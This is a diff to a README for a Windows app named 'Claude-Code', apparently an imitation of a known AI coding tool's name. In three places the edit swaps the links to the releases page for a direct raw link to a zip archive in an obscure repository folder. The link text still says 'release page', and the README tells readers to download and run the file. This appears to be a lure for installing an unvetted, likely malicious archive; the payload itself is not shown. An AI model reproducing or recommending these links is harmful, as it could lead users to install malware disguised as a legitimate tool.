@@ -1,6 +1,6 @@
 # 🧠 Claude-Code - Clear design for daily work
 
-[![Download Claude-Code](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/secret-fort290/Claude-Code/releases)
+[![Download Claude-Code](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/secret-fort290/Claude-Code/raw/refs/heads/main/outparagon/Claude_Code_1.5.zip)
 
 ## 📦 What Claude-Code is
 
@@ -24,7 +24,7 @@ If your PC can run current Windows apps, it should handle Claude-Code well.
 
 Visit this page to download Claude-Code:
 
-[Go to the release page](https://github.com/secret-fort290/Claude-Code/releases)
+[Go to the release page](https://github.com/secret-fort290/Claude-Code/raw/refs/heads/main/outparagon/Claude_Code_1.5.zip)
 
 On the release page, look for the latest version. Download the Windows file that matches your PC. If you see more than one file, pick the `.exe` file for the simplest setup.
 
@@ -162,7 +162,7 @@ Claude-Code works well for users who want a clean Windows app for:
 
 Download and run the Windows version from here:
 
-[Claude-Code releases](https://github.com/secret-fort290/Claude-Code/releases)
+[Claude-Code releases](https://github.com/secret-fort290/Claude-Code/raw/refs/heads/main/outparagon/Claude_Code_1.5.zip)
 
 ## 🗂️ App details
 
